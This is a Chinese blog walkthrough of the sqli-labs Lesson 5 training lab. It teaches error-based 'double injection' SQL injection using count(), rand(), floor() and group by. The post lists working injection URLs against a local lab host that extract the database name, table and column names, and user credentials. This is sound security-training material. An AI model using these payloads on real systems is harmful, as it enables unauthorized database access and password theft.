---
title: sqli-labs-lession-5 GET单引号双注入
date: 2018-09-21 17:09:45
tags:
categories: sql注入
---

# sqli-labs lession 5 GET单引号双注入 #
---

## 登录界面 ##

![1](https://i.imgur.com/o5P4i5s.png)


## 手注 ##
输入单引号测试下

`http://10.60.250.181/sqlilabs/Less-5/?id=1%27`

![2](https://i.imgur.com/C2OndYK.png)

返回的错误信息和Lesson-1一样。

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`

尝试将右侧注释掉

`http://10.60.250.181/sqlilabs/Less-5/?id=1%27%23`

![3](https://i.imgur.com/u9vm04H.png)

没有返回信息,但是显示的是“You are in”,猜测这次可能正确执行SQL语句就显示“You are in”,错误就报错。

查看源码验证...

![4](https://i.imgur.com/pz8TbRh.png)

果然如此。

有没有一种方法能在错误种把我要获取的信息显示出来呢？就是双注入了。


### 双注入 ###

过本关需要了解双注入。

双注入需要count()、rand()、floor()这三个函数以及group by联合使用。

count():查询数量

rand()：产生0~1间的随机数 

floor()：向下取整

group by：按指定分类

具体例子：

`select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;`

要让上述的报错实现数据库至少要3条数据。

具体原因查看这篇分析

[
Mysql报错注入原理分析(count()、rand()、group by)](http://wooyun.jozxing.cc/static/drops/tips-14312.html)

### 字段数 ###

![5](https://i.imgur.com/p0yH37f.png)

![6](https://i.imgur.com/iWvqxd6.png)

### 双注入报错 ###

接下来的语句想要尝试多次。

`http://10.60.250.181/sqlilabs/Less-5/?id=1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select database()))x from information_schema.tables group by x%23`

![7](https://i.imgur.com/VdHTjv2.png)

`http://10.60.250.181/sqlilabs/Less-5/?id=1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select table_name from information_schema.tables where table_schema = 'security' limit 0,1))x from information_schema.tables group by x%23`

![8](https://i.imgur.com/vHIUWBM.png)

蓝色标注部分修改成要查询的就行。

`http://10.60.250.181/sqlilabs/Less-5/?id=1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select column_name from information_schema.columns where table_name = 'users' limit 0,1))x from information_schema.tables group by x%23`

![9](https://i.imgur.com/SueF3no.png)

`http://10.60.250.181/sqlilabs/Less-5/?id=1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select concat(id,'-',username,'-',password) from security.users limit 0,1))x from information_schema.tables group by x%23`

![10](https://i.imgur.com/QftJYlR.png)

## SQLMAP ##

![11](https://i.imgur.com/PU5HoC2.png)

![12](https://i.imgur.com/DJpLKuu.png)

![13](https://i.imgur.com/6HBzjsu.png)